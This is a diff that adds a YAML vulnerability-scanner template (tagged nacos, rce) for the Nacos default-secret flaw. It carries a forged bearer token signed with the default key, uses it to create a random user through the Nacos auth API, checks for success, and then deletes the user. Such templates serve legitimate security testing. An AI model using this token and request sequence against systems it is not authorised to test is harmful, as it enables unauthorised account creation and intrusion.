@@ -1,0 +1,33 @@
+id: nacos-token-create-user
+
+info:
+  name: Nacos 默认密钥创建用户
+  author: zan8in
+  severity: critical
+  verified: true
+  description: |-
+    Nacos 默认密钥创建用户
+  tags: nacos,rce
+  created: 2024/07/20
+
+set:
+  token: eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTY5ODg5NDcyN30.feetKmWoPnMkAebjkNnyuKo6c21_hzTgu0dfNqbdpZQ
+  randuser: randomLowercase(6)
+  randpass: randomLowercase(8)
+rules:
+  r0:
+    request:
+      method: POST
+      path: /nacos/v1/auth/users
+      headers:
+        Authorization: Bearer {{token}}
+      body: username={{randuser}}&password={{randpass}}
+    expression: response.status == 200 && response.body.bcontains(b'"code":') && response.body.bcontains(b'"message":') && response.body.bcontains(b'"data":') && response.body.bcontains(b'create user ok!')
+  r1:
+    request:
+      method: DELETE
+      path: /nacos/v1/auth/users?username={{randuser}}
+      headers:
+        Authorization: Bearer {{token}}
+    expression: true
+expression: r0() && r1()
